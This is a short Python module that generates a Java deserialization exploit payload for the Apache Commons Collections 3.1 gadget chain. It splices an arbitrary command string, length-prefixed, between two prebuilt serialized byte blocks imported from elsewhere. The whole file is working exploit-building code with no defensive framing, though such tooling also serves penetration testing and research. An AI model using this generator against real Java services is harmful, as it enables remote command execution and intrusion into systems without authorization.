from src.payloads.generate_commons_collections31_payload import payload_1__generate_commons_collections31_payload, \
    payload_2__generate_commons_collections31_payload


def generate_commons_collections31_payload(cmd: str) -> bytes:
    payload = payload_1__generate_commons_collections31_payload
    cmd_bytes = cmd.encode('utf-8')
    payload += len(cmd_bytes).to_bytes(1, 'big') + cmd_bytes
    payload += payload_2__generate_commons_collections31_payload
    return payload
